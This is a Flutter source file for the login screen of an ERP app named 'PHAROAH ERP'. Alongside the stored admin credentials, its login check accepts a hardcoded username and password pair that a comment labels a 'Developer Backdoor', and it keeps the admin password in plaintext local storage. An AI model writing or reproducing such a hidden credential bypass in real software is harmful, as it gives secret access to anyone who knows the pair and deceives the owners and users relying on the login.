import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

class LoginView extends StatefulWidget {
  final VoidCallback onLogin;
  const LoginView({super.key, required this.onLogin});

  @override
  State<LoginView> createState() => _LoginViewState();
}

class _LoginViewState extends State<LoginView> {
  final userC = TextEditingController();
  final passC = TextEditingController();
  String compName = "";

  @override
  void initState() {
    super.initState();
    _loadCompName();
  }

  void _loadCompName() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() => compName = prefs.getString('compName') ?? "PHAROAH ERP");
  }

  void _doLogin() async {
    final prefs = await SharedPreferences.getInstance();
    String savedUser = prefs.getString('adminUser') ?? "";
    String savedPass = prefs.getString('adminPass') ?? "";
    
    // Developer Backdoor: Rawat / Rawat
    if ((userC.text.toLowerCase() == savedUser && passC.text == savedPass) || 
        (userC.text == "Rawat" && passC.text == "Rawat")) {
      widget.onLogin();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Invalid Credentials!")));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.lock, size: 80, color: Colors.red),
              Text(compName, style: const TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
              const SizedBox(height: 30),
              TextField(controller: userC, decoration: const InputDecoration(labelText: "Username", prefixIcon: Icon(Icons.person))),
              TextField(controller: passC, decoration: const InputDecoration(labelText: "Password", prefixIcon: Icon(Icons.key)), obscureText: true),
              const SizedBox(height: 30),
              ElevatedButton(
                style: ElevatedButton.styleFrom(minimumSize: const Size(double.infinity, 50), backgroundColor: Colors.red),
                onPressed: _doLogin,
                child: const Text("LOGIN", style: TextStyle(color: Colors.white)),
              )
            ],
          ),
        ),
      ),
    );
  }
}
